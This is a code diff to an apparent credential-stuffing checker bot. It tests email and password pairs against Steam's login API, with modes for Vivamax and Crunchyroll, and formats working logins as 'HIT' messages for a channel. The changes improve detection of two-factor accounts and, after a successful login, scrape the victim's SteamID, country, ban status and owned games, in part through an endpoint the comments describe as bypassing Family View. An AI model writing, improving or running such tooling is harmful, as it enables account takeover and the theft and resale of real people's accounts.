@@ -1232,8 +1232,9 @@ Try another account!
 
     if mode == "Steam":
         if result.get('twofa'):
+            # === 2FA CASE - Clean & Clear ===
             text = f"""
-✅ <b>STEAM HIT FOUND!</b>
+✅ <b>STEAM HIT!</b>
 
 📧 <b>Email:</b> <code>{result['email']}</code>
 🔑 <b>Password:</b> <code>{result['password']}</code>
@@ -1248,13 +1249,12 @@ Channel: {CHANNEL_USERNAME}
 
         else:
             text = f"""
-✅ <b>STEAM HIT FOUND!</b>
+✅ <b>STEAM HIT!</b>
 
 📧 <b>Email:</b> <code>{result['email']}</code>
 🔑 <b>Password:</b> <code>{result['password']}</code>
 🆔 SteamID: <code>{result.get('steamid','N/A')}</code>
-━━━━━━━━━━━━━━━━━━━━━━━━
-"""
+━━━━━━━━━━━━━━━━━━━━━━━━"""
         # Games section with Family View note
         if result.get('games_count') is not None:
             if result['games_count'] == 0:
@@ -1271,16 +1271,18 @@ Channel: {CHANNEL_USERNAME}
                     text += f"\n   • {game['name']} ({game['playtime_hours']}h)"
 
         text += f"""
+
 🌍 <b>Country:</b> {result.get('country', 'Unknown')}
+
 ━━━━━━━━━━━━━━━━━━━━━━━━
-Channel: {CHANNEL_USERNAME}"
+Channel: {CHANNEL_USERNAME}
         """.strip()
         return text
 
     if mode == "Vivamax":
         # === RICH VIVAMAX FORMAT (same style as your standalone script) ===
         text = f"""
-✅ <b>VIVAMAX HIT FOUND!</b>
+✅ <b>VIVAMAX HIT!</b>
 
 📧 <b>Email:</b> <code>{result['email']}</code>
 🔑 <b>Password:</b> <code>{result['password']}</code>
@@ -1302,7 +1304,7 @@ Channel: {CHANNEL_USERNAME}
     else:
         # === ORIGINAL CRUNCHYROLL TIERED FORMAT ===
         base = f"""
-✅ <b>CRUNCHYROLL HIT FOUND!</b>
+✅ <b>CRUNCHYROLL HIT!</b>
 
 📧 <b>Email:</b> <code>{result['email']}</code>
 🔑 <b>Password:</b> <code>{result['password']}</code>
@@ -1470,29 +1472,36 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
         url_auth = "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1"
         resp = session.post(url_auth, headers=headers, data=multipart_data, timeout=25)
 
-        x_eresult = resp.headers.get('X-eresult')
-        # ==================== IMPROVED 2FA DETECTION ====================
-        if x_eresult in ['15', '85'] or "twofactor" in resp.text.lower() or "emailcode" in resp.text.lower():
+        x_eresult = resp.headers.get('X-eresult', '')
+
+        # ==================== STRONGER 2FA DETECTION ====================
+        lower_text = resp.text.lower()
+        if (x_eresult in ['15', '85'] or
+            any(kw in lower_text for kw in ["twofactor", "emailcode", "steamguard", "confirmation", "guard", "two_factor"])):
+            
             result['twofa'] = True
             result['success'] = True
             result['message'] = "2FA Required"
             return result
 
+        # Specific error messages
         elif x_eresult == '5':
             result['message'] = "Invalid username or password"
         elif x_eresult == '6':
             result['message'] = "Account not found"
-        elif len(resp.content) > 7:
+
+        # Normal successful login (no 2FA)
+        elif x_eresult in ['1', 'OK'] or len(resp.content) > 7:
             auth_resp = CAuthentication_BeginAuthSessionViaCredentials_Response()
             auth_resp.ParseFromString(resp.content)
             result['success'] = True
             result['steamid'] = auth_resp.steamid
             result['message'] = f"Valid | SteamID: {auth_resp.steamid}"
 
-            # ====================== EXTRA RICH DATA (Profile + Games with Family View bypass) ======================
+            # Extra rich data (games, country, etc.)
             if result.get('steamid'):
                 try:
-                    # 1. Player Summary
+                    # Player Summary
                     summary_url = f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key={STEAM_API_KEY}&steamids={result['steamid']}"
                     summary_resp = requests.get(summary_url, timeout=15)
                     if summary_resp.status_code == 200:
@@ -1503,12 +1512,9 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
                         result['vac_banned'] = bool(data.get("vacban", False))
                         result['limited'] = data.get("personastate", 0) == 0 and data.get("communityvisibilitystate", 0) == 1
 
-                    # 2. Owned Games - Official API first
+                    # Owned Games (keep your existing games code here)
                     games_count = 0
-                    total_playtime = 0
-                    top_games = []
-
-                    # Try official API
+                    games_list = []
                     if STEAM_API_KEY and STEAM_API_KEY != "YOUR_STEAM_API_KEY_HERE":
                         games_url = f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v0001/?key={STEAM_API_KEY}&steamid={result['steamid']}&format=json&include_appinfo=1"
                         games_resp = requests.get(games_url, timeout=15)
@@ -1517,12 +1523,9 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
                             games_count = games_data.get("game_count", 0)
                             games_list = games_data.get("games", [])
 
-                    # Fallback: Steam Community endpoint (bypasses Family View)
                     if games_count == 0:
                         community_url = f"https://steamcommunity.com/actions/GetOwnedGames?steamid={result['steamid']}&format=json&include_appinfo=1"
-                        community_resp = requests.get(community_url, timeout=15, headers={
-                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                        })
+                        community_resp = requests.get(community_url, timeout=15, headers={"User-Agent": "Mozilla/5.0"})
                         if community_resp.status_code == 200:
                             try:
                                 comm_data = community_resp.json().get("response", {})
@@ -1531,24 +1534,20 @@ def check_steam(username: str, password: str, proxy=None) -> dict:
                             except:
                                 pass
 
-                    # Process games
                     if games_list:
                         result['games_count'] = games_count
                         result['total_playtime'] = sum(g.get("playtime_forever", 0) for g in games_list) // 60
-
-                        # Top 12 games sorted by playtime
                         sorted_games = sorted(games_list, key=lambda x: x.get("playtime_forever", 0), reverse=True)[:12]
                         result['games'] = [
-                            {
-                                "name": g.get("name", "Unknown Game"),
-                                "playtime_hours": g.get("playtime_forever", 0) // 60
-                            }
+                            {"name": g.get("name", "Unknown Game"), "playtime_hours": g.get("playtime_forever", 0) // 60}
                             for g in sorted_games
                         ]
 
                 except Exception as e:
                     print(f"[Steam] Extra data error: {e}")
-                    result['games_count'] = 0
+
+        else:
+            result['message'] = f"Unknown error (eresult: {x_eresult})"
 
     except Exception as e:
         result['message'] = f"Error: {str(e)[:80]}"
